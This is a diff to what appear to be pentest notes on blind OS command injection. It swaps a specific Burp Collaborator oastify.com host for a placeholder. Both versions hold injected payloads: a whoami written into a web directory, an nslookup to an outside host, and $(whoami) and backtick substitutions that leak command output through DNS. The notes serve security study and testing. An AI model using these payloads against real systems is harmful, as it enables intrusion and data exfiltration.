@@ -12,8 +12,8 @@
 & whoami > /var/www/images/whoami.txt &
 
 # Blind with out of band interaction
-& nslookup mi86pgr46evnqr4veh8s7s9i89e02qqf.oastify.com &
+& nslookup <YOUR-COLLABORATOR> &
 
 # You can then append commands like:
 # Blind with out of band interaction and data exfil
-$(whoami).mi86pgr46evnqr4veh8s7s9i89e02qqf.oastify.com or `whoami`.mi86pgr46evnqr4veh8s7s9i89e02qqf.oastify.com
+$(whoami).<YOUR-COLLABORATOR> or `whoami`.<YOUR-COLLABORATOR>
